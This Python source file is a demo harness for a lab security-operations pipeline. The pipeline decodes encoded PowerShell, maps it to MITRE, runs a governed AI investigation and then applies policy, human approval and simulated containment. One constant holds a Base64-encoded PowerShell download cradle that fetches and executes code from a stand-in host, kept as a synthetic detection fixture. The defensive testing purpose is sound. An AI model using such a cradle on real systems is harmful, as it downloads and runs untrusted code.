"""End-to-End Demo Integration Harness for the AI-Native SOC Lab.

Stitches together the already-implemented components (Milestones 1-4) into a single,
interview-friendly security investigation and governance workflow:

    detection / incident input
        -> bounded Splunk evidence retrieval
        -> deterministic decoding / MITRE mapping
        -> AI investigation (ToolRouter-governed)
        -> deterministic risk/action policy
        -> human approval when required
        -> simulated response only
        -> audit events
        -> safe final summary

Execution Boundaries & Security Invariants:
1. NO NEW AUTHORITY: Orchestrates existing modules only. Zero subprocess, shell,
   or network execution outside existing provider and bounded Splunk client.
2. SIMULATED ONLY: All containment actions are strictly simulated. Zero endpoint mutation.
3. FAIL-CLOSED: Bounded Splunk search, model errors, schema validation, approval denial,
   and audit logging all fail closed deterministically.
4. TWO MODES:
   - live-benign: Real bounded Splunk query targeting DC01 for controlled benign fixture.
     Evaluates to LOW / NO_ACTION. Never prompts for human approval.
   - synthetic-critical: Sanitized local suspicious fixture with deterministic FakeModel.
     Evaluates to CRITICAL / APPROVAL_REQUIRED / SIMULATE_ENDPOINT_ISOLATION.
     Prompts operator for explicit approval or denial.
"""

import argparse
from datetime import datetime, timezone
import io
from pathlib import Path
import sys
from typing import Any, Dict, List, Optional, TextIO, Tuple

# Ensure repository root is on sys.path
_REPO_ROOT = Path(__file__).resolve().parent.parent
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

from gateway.splunk_search import (
    SplunkConnectionError,
    SplunkResponseError,
    SplunkSearchClient,
    SplunkSearchError,
)
from investigator.approval import (
    ActionAuthorizationContext,
    ApprovalDecision,
    ApprovalGateError,
    ApprovalRecord,
    request_cli_approval,
)
from investigator.audit import AuditEvent, AuditEventType, AuditLog
from investigator.audit_writer import (
    AuditPathError,
    AuditWriteError,
    AuditWriterError,
    DEFAULT_AUDIT_LOG_PATH,
    JsonlAuditWriter,
)
from investigator.fake_model import FakeModel
from investigator.model import (
    DecisionType,
    ModelDecision,
    ToolRequest,
)
from investigator.orchestrator import (
    InvestigationOrchestrator,
    OrchestratorError,
)
from investigator.policy import (
    BENIGN_LAB_DETECTION_ID,
    EXACT_BENIGN_COMMAND,
    ActionDisposition,
    PolicyContext,
    PolicyDecision,
    ProposedAction,
    RiskLevel,
    RiskPolicyEngine,
)
from investigator.simulator import (
    SimulatedResponseExecutor,
    SimulationError,
    SimulationResult,
    SimulationStatus,
)
from investigator.schemas import (
    InvestigationInput,
    InvestigationResult,
)
from investigator.tool_router import ToolRouter
from investigator.tools.base64_decoder import (
    DecoderError,
    decode_powershell_base64,
)
from investigator.tools.mitre_mapper import map_detection_to_mitre


SYNTHETIC_CRITICAL_PAYLOAD_B64 = (
    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcwAiACkA"
)


def _parse_event_timestamp(time_str: str) -> Optional[datetime]:
    """Safely parse a Splunk _time string into a UTC datetime using standard library only."""
    if not isinstance(time_str, str) or not time_str.strip():
        return None
    cleaned = time_str.strip()
    if cleaned.endswith(" UTC"):
        cleaned = cleaned[:-4].rstrip() + "+00:00"
    elif cleaned.endswith("Z"):
        cleaned = cleaned[:-1] + "+00:00"

    try:
        dt = datetime.fromisoformat(cleaned)
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        return dt
    except (ValueError, TypeError):
        return None


def _find_exact_benign_fixture(
    records: List[Dict[str, Any]],
) -> Optional[Tuple[Dict[str, Any], str]]:
    """Order candidates by _time (newest first) and select the exact benign fixture.

    Returns:
        Tuple of (selected_record, decoded_text) if found, else None.
    """
    dated_candidates: List[Tuple[datetime, Dict[str, Any]]] = []
    for rec in records:
        ts_str = rec.get("_time", "")
        dt = _parse_event_timestamp(ts_str)
        if dt is not None:
            dated_candidates.append((dt, rec))

    # Sort descending: newest first
    dated_candidates.sort(key=lambda item: item[0], reverse=True)

    for _dt, rec in dated_candidates:
        cmd_line = rec.get("CommandLine", "")
        try:
            decode_res = decode_powershell_base64(cmd_line)
            if (
                decode_res.success
                and decode_res.decoded_text.strip() == EXACT_BENIGN_COMMAND
            ):
                return rec, decode_res.decoded_text
        except (DecoderError, ValueError):
            continue

    return None


def _create_synthetic_critical_model(
    command_line: str,
    detection_name: str,
    decoded_command: str,
    incident_id: str,
) -> FakeModel:
    """Construct a deterministic FakeModel sequence that exercises ToolRouter."""
    decisions = [
        ModelDecision(
            decision_type=DecisionType.TOOL_REQUEST,
            tool_request=ToolRequest(
                tool_name="decode_base64_powershell",
                arguments={"encoded_input": command_line},
            ),
        ),
        ModelDecision(
            decision_type=DecisionType.TOOL_REQUEST,
            tool_request=ToolRequest(
                tool_name="map_mitre_technique",
                arguments={"detection_ref": detection_name, "fail_closed": False},
            ),
        ),
        ModelDecision(
            decision_type=DecisionType.FINAL_RESULT,
            final_result=InvestigationResult(
                summary="Suspicious PowerShell download cradle pattern detected.",
                observations=(
                    "Encoded PowerShell command detected",
                    "Decoded payload attempts network download via WebClient",
                ),
                decoded_command=decoded_command,
                mitre_techniques=("T1059.001",),
                suspicious_indicators=("download_cradle", "untrusted_network_fetch"),
                recommended_next_step="Isolate endpoint DC01 and investigate network egress.",
                confidence_level="high",
                evidence_refs=(incident_id,),
            ),
        ),
    ]
    return FakeModel(decisions)


def _create_live_benign_fake_model(
    command_line: str,
    detection_name: str,
    decoded_command: str,
    incident_id: str,
) -> FakeModel:
    """Construct a deterministic FakeModel sequence for benign mode."""
    decisions = [
        ModelDecision(
            decision_type=DecisionType.TOOL_REQUEST,
            tool_request=ToolRequest(
                tool_name="decode_base64_powershell",
                arguments={"encoded_input": command_line},
            ),
        ),
        ModelDecision(
            decision_type=DecisionType.TOOL_REQUEST,
            tool_request=ToolRequest(
                tool_name="map_mitre_technique",
                arguments={"detection_ref": detection_name, "fail_closed": False},
            ),
        ),
        ModelDecision(
            decision_type=DecisionType.FINAL_RESULT,
            final_result=InvestigationResult(
                summary="Controlled benign lab administrative test script executed on DC01.",
                observations=(
                    "PowerShell executed with Base64 encoded payload",
                    "Decoded payload matches known benign lab test fixture",
                ),
                decoded_command=decoded_command,
                mitre_techniques=("T1059.001",),
                suspicious_indicators=(),
                recommended_next_step="No further action needed; benign verification confirmed.",
                confidence_level="high",
                evidence_refs=(incident_id,),
            ),
        ),
    ]
    return FakeModel(decisions)


def _render_safe_summary(
    stream: TextIO,
    incident: InvestigationInput,
    evidence_source: str,
    retrieved_count: int,
    decoded_command: Optional[str],
    mitre_technique: Optional[str],
    inv_result: InvestigationResult,
    decision: PolicyDecision,
    approval_record: Optional[ApprovalRecord],
    sim_result: SimulationResult,
    audit_log: AuditLog,
    persisted_path: Optional[Path] = None,
) -> None:
    """Render structured, safe demo metadata without secrets or unbounded payloads."""
    stream.write("\n" + "=" * 64 + "\n")
    stream.write("  AI-Native SOC Lab -- End-to-End Demo Outcome\n")
    stream.write("  SIMULATED ONLY -- NO ENDPOINT ACTION PERFORMED\n")
    stream.write("=" * 64 + "\n")

    stream.write("\n[1. INCIDENT & EVIDENCE METADATA]\n")
    stream.write(f"  Incident ID:       {incident.incident_id}\n")
    stream.write(f"  Timestamp:         {incident.timestamp}\n")
    stream.write(f"  Target Host:       {incident.host}\n")
    stream.write(f"  Target User:       {incident.user}\n")
    stream.write(f"  Detection Name:    {incident.detection_name}\n")
    stream.write(f"  Detection ID:      {incident.detection_id}\n")
    stream.write(f"  Evidence Source:   {evidence_source}\n")
    if retrieved_count > 0:
        stream.write(f"  Splunk Events:     {retrieved_count} retrieved (bounded)\n")
    snippet = decoded_command if decoded_command else "<none>"
    if len(snippet) > 80:
        snippet = snippet[:77] + "..."
    stream.write(f"  Decoded Command:   {snippet}\n")
    stream.write(f"  MITRE Technique:   {mitre_technique or '<unmapped>'}\n")

    stream.write("\n[2. AI INVESTIGATION (ADVISORY)]\n")
    stream.write(f"  Summary:           {inv_result.summary}\n")
    stream.write(f"  Confidence:        {inv_result.confidence_level}\n")
    stream.write(f"  Indicators Count:  {len(inv_result.suspicious_indicators)}\n")
    stream.write(f"  Next Step:         {inv_result.recommended_next_step}\n")

    stream.write("\n[3. DETERMINISTIC POLICY EVALUATION]\n")
    stream.write(f"  Risk Score:        {decision.risk_score} / 100\n")
    stream.write(f"  Risk Level:        {decision.risk_level.value}\n")
    stream.write(f"  Disposition:       {decision.action_disposition.value}\n")
    stream.write(f"  Proposed Action:   {decision.proposed_action.value}\n")
    stream.write(f"  Approval Required: {'yes' if decision.requires_human_approval else 'no'}\n")
    stream.write(f"  Policy Reasons:    {', '.join(decision.reasons)}\n")

    stream.write("\n[4. HUMAN APPROVAL & SIMULATION OUTCOME]\n")
    if approval_record is not None:
        stream.write(f"  Approval Decision: {approval_record.decision.value} ({approval_record.reason_code})\n")
        stream.write(f"  Approver Label:    {approval_record.approver}\n")
    else:
        stream.write("  Approval Prompt:   SKIPPED (Action does not require approval)\n")

    stream.write(f"  Simulation Status: {sim_result.status.value}\n")
    stream.write(f"  Detail Code:       {sim_result.detail_code}\n")

    if sim_result.status is SimulationStatus.SIMULATED:
        stream.write("\n  >>> SIMULATED CONTAINMENT RECORDED <<<\n")
        stream.write("  The security platform records that endpoint isolation would\n")
        stream.write("  have been requested in production.\n")
        stream.write("  SIMULATED ONLY -- NO ENDPOINT ACTION PERFORMED\n")
    else:
        stream.write("\n  >>> ACTION NOT EXECUTED <<<\n")
        stream.write("  No containment action executed or authorized.\n")
        stream.write("  Endpoint state remains completely unmodified.\n")

    stream.write("\n[5. AUDIT TRAIL]\n")
    events = audit_log.events()
    stream.write(f"  In-Memory Events:  {len(events)} events recorded\n")
    for ev in events:
        stream.write(f"    Seq {ev.sequence:02d}: {ev.event_type.value:25} (detail={ev.detail_code})\n")

    if persisted_path is not None:
        stream.write(f"  Persisted JSONL:   {persisted_path}\n")

    stream.write("=" * 64 + "\n\n")
    stream.flush()


def run_demo(
    mode: str,
    provider: Optional[str] = None,
    minutes: int = 15,
    persist_audit: bool = False,
    stream_in: Optional[TextIO] = None,
    stream_out: Optional[TextIO] = None,
    splunk_client: Optional[SplunkSearchClient] = None,
    audit_log_path: Optional[Path] = None,
) -> int:
    """Execute the end-to-end integration demo workflow.

    Returns:
        0 on success, nonzero integer on failure / fail-closed termination.
    """
    in_stream = stream_in if stream_in is not None else sys.stdin
    out_stream = stream_out if stream_out is not None else sys.stdout

    audit_log = AuditLog()

    # -----------------------------------------------------------------------
    # Step 1: Evidence Acquisition & Incident Input Construction
    # -----------------------------------------------------------------------
    if mode == "live-benign":
        client = splunk_client or SplunkSearchClient(verify_tls=False)
        out_stream.write(f"[*] Querying bounded Splunk search on localhost:8089 (host=DC01, minutes={minutes}, limit=5)...\n")
        out_stream.flush()

        try:
            raw_records = client.search_encoded_powershell(
                host="DC01",
                minutes=minutes,
                limit=5,
            )
        except SplunkConnectionError as err:
            out_stream.write(f"[!] Splunk connection error: {err}\n")
            out_stream.write("[!] Note: live-benign requires running locally on Splunk-Server (localhost:8089).\n")
            out_stream.write("[!] For offline/local demonstration, run with --mode synthetic-critical.\n")
            return 1
        except (SplunkResponseError, SplunkSearchError) as err:
            out_stream.write(f"[!] Bounded Splunk search failed: {err}\n")
            return 1

        if not raw_records:
            out_stream.write("[!] Controlled benign lab fixture not found in the bounded Splunk window.\n")
            out_stream.write("[!] Generate the approved benign test event and retry.\n")
            return 1

        fixture_match = _find_exact_benign_fixture(raw_records)
        if fixture_match is None:
            out_stream.write("[!] Controlled benign lab fixture not found in the bounded Splunk window.\n")
            out_stream.write("[!] Generate the approved benign test event and retry.\n")
            return 1

        selected_record, deterministic_decoded = fixture_match
        clean_time_id = selected_record["_time"].replace(":", "").replace("-", "").replace(" ", "T").replace("+", "")
        # Keep incident_id strictly ASCII alphanumeric and <= 64 chars
        incident_id = f"INC-LIVE-DC01-{clean_time_id}"[:60]

        incident = InvestigationInput(
            incident_id=incident_id,
            timestamp=selected_record["_time"],
            host="DC01",
            user=selected_record["User"],
            image=selected_record["Image"],
            command_line=selected_record["CommandLine"],
            parent_image=selected_record["ParentImage"],
            parent_command_line=selected_record["ParentCommandLine"],
            detection_name="suspicious encoded powershell execution",
            detection_id=BENIGN_LAB_DETECTION_ID,
        )
        evidence_source = "Live Splunk (localhost:8089)"
        retrieved_count = len(raw_records)

    elif mode == "synthetic-critical":
        incident = InvestigationInput(
            incident_id="INC-DEMO-CRIT-2026-001",
            timestamp="2026-09-17T12:00:00Z",
            host="DC01",
            user="SYSTEM",
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=f"powershell.exe -enc {SYNTHETIC_CRITICAL_PAYLOAD_B64}",
            parent_image="C:\\Windows\\System32\\cmd.exe",
            parent_command_line="cmd.exe /c start",
            detection_name="suspicious encoded powershell execution",
            detection_id=BENIGN_LAB_DETECTION_ID,
        )
        try:
            decode_res = decode_powershell_base64(incident.command_line)
            deterministic_decoded = decode_res.decoded_text
        except (DecoderError, ValueError):
            deterministic_decoded = None

        evidence_source = "Sanitized Local Synthetic Fixture"
        retrieved_count = 0
    else:
        out_stream.write(f"[!] Unknown mode: {mode}\n")
        return 1

    # -----------------------------------------------------------------------
    # Step 2: Deterministic Pre-computations (Trusted Facts)
    # -----------------------------------------------------------------------
    mitre_res = map_detection_to_mitre(incident.detection_name, fail_closed=False)
    mitre_id = mitre_res.technique_id if mitre_res.mapped else None
    tool_failure = deterministic_decoded is None

    # -----------------------------------------------------------------------
    # Step 3: AI Investigation Session (Advisory Hypotheses via ToolRouter)
    # -----------------------------------------------------------------------
    tool_router = ToolRouter(splunk_client=splunk_client)

    if mode == "synthetic-critical":
        model = _create_synthetic_critical_model(
            command_line=incident.command_line,
            detection_name=incident.detection_name,
            decoded_command=deterministic_decoded or "",
            incident_id=incident.incident_id,
        )
    else:  # live-benign
        if provider == "openai":
            from investigator.providers.openai_provider import (
                OpenAIModel,
                OpenAIProviderError,
            )
            try:
                model = OpenAIModel()
            except OpenAIProviderError as err:
                out_stream.write(f"[!] OpenAI provider configuration failed: {err}\n")
                return 1
        else:
            model = _create_live_benign_fake_model(
                command_line=incident.command_line,
                detection_name=incident.detection_name,
                decoded_command=deterministic_decoded or "",
                incident_id=incident.incident_id,
            )

    orchestrator = InvestigationOrchestrator(
        model=model,
        tool_router=tool_router,
        audit_log=audit_log,
    )

    try:
        inv_result = orchestrator.investigate(incident)
    except OrchestratorError as err:
        out_stream.write(f"[!] Investigation orchestrator failed: {err}\n")
        return 1

    # -----------------------------------------------------------------------
    # Step 4: Deterministic Policy Evaluation (Trusted Authority)
    # -----------------------------------------------------------------------
    policy_context = PolicyContext(
        alert=incident,
        verified_detection_id=incident.detection_id,
        deterministic_decoded_command=deterministic_decoded,
        mitre_technique_id=mitre_id,
        tool_failure_or_incomplete_evidence=tool_failure,
    )

    policy_engine = RiskPolicyEngine()
    policy_decision = policy_engine.evaluate(
        context=policy_context,
        investigation_result=inv_result,
        audit_log=audit_log,
    )

    auth_context = ActionAuthorizationContext(
        incident_id=incident.incident_id,
        policy_decision=policy_decision,
    )

    # -----------------------------------------------------------------------
    # Step 5: Human Approval Gate (Only when strictly required)
    # -----------------------------------------------------------------------
    approval_record: Optional[ApprovalRecord] = None
    if policy_decision.requires_human_approval:
        try:
            approval_record = request_cli_approval(
                context=auth_context,
                stream_in=in_stream,
                stream_out=out_stream,
                audit_log=audit_log,
            )
        except ApprovalGateError as err:
            out_stream.write(f"[!] Approval gate error: {err}\n")
            return 1

    # -----------------------------------------------------------------------
    # Step 6: Simulated Response Execution (Zero Endpoint Mutation)
    # -----------------------------------------------------------------------
    executor = SimulatedResponseExecutor()
    try:
        sim_result = executor.execute(
            authorization_context=auth_context,
            approval_record=approval_record,
            audit_log=audit_log,
        )
    except SimulationError as err:
        out_stream.write(f"[!] Simulated response execution error: {err}\n")
        return 1

    # -----------------------------------------------------------------------
    # Step 7: Optional JSONL Persistence (Post-Workflow Higher-Level Sink)
    # -----------------------------------------------------------------------
    target_audit_path: Optional[Path] = None
    if persist_audit:
        target_audit_path = audit_log_path or DEFAULT_AUDIT_LOG_PATH
        try:
            writer = JsonlAuditWriter(target_audit_path)
            writer.write_events(audit_log.events())
        except (AuditWriterError, AuditPathError, AuditWriteError) as err:
            out_stream.write(f"[!] audit_persistence_failed: {err}\n")
            return 1

    # -----------------------------------------------------------------------
    # Step 8: Safe Final Summary
    # -----------------------------------------------------------------------
    _render_safe_summary(
        stream=out_stream,
        incident=incident,
        evidence_source=evidence_source,
        retrieved_count=retrieved_count,
        decoded_command=deterministic_decoded,
        mitre_technique=mitre_id,
        inv_result=inv_result,
        decision=policy_decision,
        approval_record=approval_record,
        sim_result=sim_result,
        audit_log=audit_log,
        persisted_path=target_audit_path,
    )

    return 0


def main() -> int:
    """Parse command line arguments and execute the demo harness."""
    parser = argparse.ArgumentParser(
        description="AI-Native SOC Lab -- End-to-End Demo Integration Harness",
    )
    parser.add_argument(
        "--mode",
        choices=["live-benign", "synthetic-critical"],
        required=True,
        help="Demo mode to execute (live-benign or synthetic-critical).",
    )
    parser.add_argument(
        "--provider",
        choices=["fake", "openai"],
        default=None,
        help="Model provider for live-benign mode (fake or openai). Forbidden on synthetic-critical.",
    )
    parser.add_argument(
        "--minutes",
        type=int,
        default=15,
        help="Lookback window in minutes for live Splunk search (1-60, default: 15).",
    )
    parser.add_argument(
        "--persist-audit",
        action="store_true",
        help="Persist audit trail to JSONL via JsonlAuditWriter.",
    )

    args = parser.parse_args()

    # Invariant: synthetic-critical mode must NOT accept --provider
    if args.mode == "synthetic-critical" and args.provider is not None:
        parser.error("--provider is not allowed for synthetic-critical mode (strictly uses deterministic FakeModel)")

    # live-benign defaults to fake if not specified
    provider = args.provider
    if args.mode == "live-benign" and provider is None:
        provider = "fake"

    if not (1 <= args.minutes <= 60):
        parser.error("--minutes must be between 1 and 60")

    return run_demo(
        mode=args.mode,
        provider=provider,
        minutes=args.minutes,
        persist_audit=args.persist_audit,
    )


if __name__ == "__main__":
    sys.exit(main())
